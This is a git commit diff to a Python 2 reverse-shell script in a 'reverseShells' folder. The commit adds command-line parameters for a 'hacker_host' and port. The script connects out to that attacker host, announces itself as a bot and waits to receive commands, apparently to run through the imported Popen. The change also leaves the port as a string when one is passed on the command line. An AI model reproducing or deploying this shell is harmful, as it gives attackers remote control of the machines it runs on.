7ab07dab68e8aa787b251f3d40a7e08c8f6e2748
Bobby Valenzuela <bobby.valenzuela@protonmail.com>
2023-01-08 18:53:27 -0800

    Added parameters for server/port

--- reverseShells/reverseShell.py
+++ reverseShells/reverseShell.py
@@ -9,13 +9,24 @@ import sys
 from subprocess import Popen, PIPE
 from socket import *
 
-serverName = sys.argv[1]
-serverPort = 8000
+# Guard clause
+if len(sys.argv) < 2 :
+    print "Missing one argument.\nUsage: {} <hacker_host> <port - optional>\nExiting.".format(sys.argv[0])
+    exit()
 
-# Create IPv4(AF_INET), TCPSocket(Sock_Stream)
+serverName = sys.argv[1]
+serverPort = sys.argv[2] if len(sys.argv) > 2 else 8000
+
+print "SERVER: {} PORT: {}".format(serverName,serverPort)
+
+# Create IPv4 (AF_INET) TCPSocket (SOCK_STREAM) on this client machine
 clientSocket = socket(AF_INET, SOCK_STREAM)
+
+# Create IPv6 (AF_INET) UDPSocket (SOCK_DGRAM)
+# clientSocket = socket(AF_INET6, SOCK_DGRAM)
+
 clientSocket.connect((serverName,serverPort))
-clientSocket.send('Bot repporting for duty'.encode())
+clientSocket.send('Bot reporting for duty'.encode())
 
 command = clientSocket.recv(4064).decode()
 
